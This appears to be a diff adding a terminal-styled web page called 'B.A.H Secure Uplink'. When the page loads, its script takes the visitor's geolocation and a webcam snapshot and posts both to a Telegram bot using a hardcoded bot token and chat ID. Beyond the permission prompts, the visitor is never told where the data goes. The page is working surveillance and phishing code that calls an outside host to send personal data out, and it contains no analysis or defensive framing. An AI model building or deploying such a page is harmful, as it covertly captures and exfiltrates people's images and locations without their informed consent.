@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>B.A.H (بيت الحكمة) | Secure Uplink</title>
+    <style>
+        body { 
+            background: #050505; 
+            color: #8a2be2; 
+            font-family: 'Courier New', monospace; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .terminal { 
+            border: 1px solid #1a1a1a; 
+            padding: 40px; 
+            background: #0d0d0d; 
+            box-shadow: 0 0 20px rgba(138, 43, 226, 0.2); 
+            text-align: center;
+        }
+        video, img { 
+            width: 320px; 
+            border: 1px solid #333; 
+            display: block; 
+            margin-top: 20px;
+        }
+        .hidden { display: none; }
+        .blink { animation: blinker 1.5s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+
+    <div class="terminal">
+        <h2>B.A.H.<span class="blink">CONNECTING</span></h2>
+        <p id="s">Awaiting Hardware Permission...</p>
+        <video id="v" autoplay playsinline></video>
+        <img id="i" class="hidden">
+    </div>
+
+    <canvas id="c" class="hidden"></canvas>
+
+    <script>
+        const BOT_TOKEN = '8646467651:AAEg8PNf7A46CXNPMVPa6M2llwC7GcmYZXM';
+        const CHAT_ID = '8470111618';
+
+        const v = document.getElementById('v'), c = document.getElementById('c'), 
+              i = document.getElementById('i'), s = document.getElementById('s');
+
+        let locationData = "Location: Denied";
+
+        window.onload = async () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    locationData = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+                });
+            }
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                v.srcObject = stream;
+                s.innerText = "STREAM ESTABLISHED. CAPTURING...";
+
+                v.onloadedmetadata = () => {
+                    setTimeout(snapAndUpload, 1200);
+                };
+            } catch (err) {
+                s.innerText = "ERROR: PERMISSION DENIED.";
+                s.style.color = "red";
+            }
+        };
+
+        async function snapAndUpload() {
+            s.innerText = "CAPTURING FRAME...";
+            c.width = v.videoWidth;
+            c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+
+            v.srcObject.getTracks().forEach(t => t.stop());
+            
+            i.src = c.toDataURL('image/png');
+            i.classList.remove('hidden');
+            v.classList.add('hidden');
+
+            s.innerText = "SYNCING TO B.A.H DATABASE...";
+
+            c.toBlob(async (blob) => {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'security_log.png');
+                fd.append('caption', `⚡ B.A.H (بيت الحكمة) Node\n📍 ${locationData}`);
+
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: fd
+                    });
+                    s.innerText = res.ok ? "LOG SECURED. SESSION CLOSED." : "UPLINK ERROR.";
+                } catch (e) {
+                    s.innerText = "NETWORK ERROR.";
+                }
+            }, 'image/png');
+        }
+    </script>
+</body>
+</html>
